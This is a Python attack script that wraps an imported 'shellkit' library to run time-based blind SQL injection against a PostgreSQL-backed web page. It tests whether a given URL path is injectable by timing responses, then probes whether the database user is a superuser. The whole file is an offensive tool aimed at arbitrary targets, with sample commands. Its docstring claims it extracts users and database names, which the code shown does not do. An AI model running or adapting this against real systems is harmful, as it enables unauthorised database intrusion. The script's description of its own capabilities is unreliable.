#!/usr/bin/env python3
"""
Author: Aleksa Zatezalo
Date: January 2025
Description: PostgreSQL information gathering exploit using time-based blind injection.
            This script extracts database information including current user, privileges,
            and database names using time-based blind SQL injection techniques.
"""

import argparse
import sys
import time
import os
from typing import Dict, Optional

# Add the shellkit directory to Python path
current_dir = os.path.dirname(os.path.abspath(__file__))
shellkit_path = os.path.abspath(os.path.join(current_dir, "../../../shellkit"))
sys.path.insert(0, shellkit_path)

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from shellkit.sql_injection.exploiter import PostgresExploiter


class Colors:
    """ANSI color codes for terminal output"""

    HEADER = "\033[95m"
    OKBLUE = "\033[94m"
    OKGREEN = "\033[92m"
    WARNING = "\033[93m"
    FAIL = "\033[91m"
    ENDC = "\033[0m"
    BOLD = "\033[1m"


def print_status(message: str, status_type: str = "info") -> None:
    """
    Print status messages with timestamp and color coding.

    Args:
        message (str): Message to print
        status_type (str): Type of message (info, success, error, warning)
    """
    timestamp = time.strftime("%H:%M:%S")
    color = {
        "info": Colors.OKBLUE,
        "success": Colors.OKGREEN,
        "error": Colors.FAIL,
        "warning": Colors.WARNING,
    }.get(status_type, Colors.OKBLUE)

    print(f"{color}[{timestamp}] {message}{Colors.ENDC}")


def print_banner() -> None:
    """Print exploit banner"""
    banner = f"""{Colors.HEADER}
         PostgreSQL Information Exploit    
            Time-based Blind SQLi          
             Author: Aleksa Zatezalo       
    {Colors.ENDC}
    """
    print(banner)


def setup_proxy(proxy_url: Optional[str]) -> Optional[Dict[str, str]]:
    """
    Setup proxy configuration if proxy URL is provided.

    Args:
        proxy_url (str): Proxy URL

    Returns:
        dict: Proxy configuration dictionary
    """
    if proxy_url:
        return {"http": proxy_url, "https": proxy_url}
    return None


def main():
    parser = argparse.ArgumentParser(
        description="PostgreSQL Information Gathering Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 postgres_exploiter.py -t http://vulnerable.com -p /page.php?id=1 -e "'"
  python3 postgres_exploiter.py -t http://vulnerable.com -p /page.php?id=1 -e ";" --proxy http://127.0.0.1:8080
  python3 postgres_exploiter.py -t http://vulnerable.com -p /page.php?id=1 -e '"' -s 5
        """,
    )

    parser.add_argument(
        "-t",
        "--target",
        required=True,
        help="Target base URL (e.g., http://target.com)",
    )
    parser.add_argument(
        "-p", "--path", required=True, help="Vulnerable path (e.g., /page.php?id=1)"
    )
    parser.add_argument(
        "-e",
        "--error-param",
        default=";",
        help="Error parameter (e.g., ', \", ;) (default: ;)",
    )
    parser.add_argument(
        "-i", "--injection-value", default="1", help="Value to inject (default: 1)"
    )
    parser.add_argument(
        "-s",
        "--sleep",
        type=int,
        default=3,
        help="Sleep time for time-based injection (default: 3)",
    )
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")

    args = parser.parse_args()

    # Construct full URL
    target_url = f"{args.target.rstrip('/')}{args.path}"

    # Setup proxy if specified
    proxy = setup_proxy(args.proxy)

    print_banner()
    print_status(f"Target URL: {target_url}")
    print_status(f"Error Parameter: {args.error_param}")
    print_status(f"Injection Value: {args.injection_value}")
    print_status(f"Sleep Time: {args.sleep} seconds")
    if proxy:
        print_status(f"Proxy: {args.proxy}")
    print()

    try:
        # Initialize exploiter
        exploiter = PostgresExploiter(
            sleep_time=args.sleep, proxy=proxy, error_param=args.error_param
        )
        exploiter.set_injection_value(args.injection_value)

        # Test for SQL injection vulnerability
        print_status("Testing for SQL injection vulnerability...", "info")
        start_time = time.time()
        response = exploiter._send_request(
            target_url, exploiter.payload_gen.test_payload()
        )
        test_time = time.time() - start_time

        if test_time >= args.sleep:
            print_status(
                f"Target is vulnerable! (Response time: {test_time:.2f}s)", "success"
            )

            # Test for superuser
            print_status("Checking superuser status...", "info")
            start_time = time.time()
            response = exploiter._send_request(
                target_url, exploiter.payload_gen.superuser_check_payload()
            )
            super_time = time.time() - start_time

            if super_time >= args.sleep:
                print_status(
                    f"Superuser: Yes (Response time: {super_time:.2f}s)", "success"
                )
            else:
                print_status(
                    f"Superuser: No (Response time: {super_time:.2f}s)", "warning"
                )
        else:
            print_status(
                f"Target does not appear to be vulnerable (Response time: {test_time:.2f}s)",
                "error",
            )
            sys.exit(1)

    except KeyboardInterrupt:
        print_status("\nExploit interrupted by user", "warning")
        sys.exit(1)
    except Exception as e:
        print_status(f"\nError during exploitation: {str(e)}", "error")
        sys.exit(1)


if __name__ == "__main__":
    main()
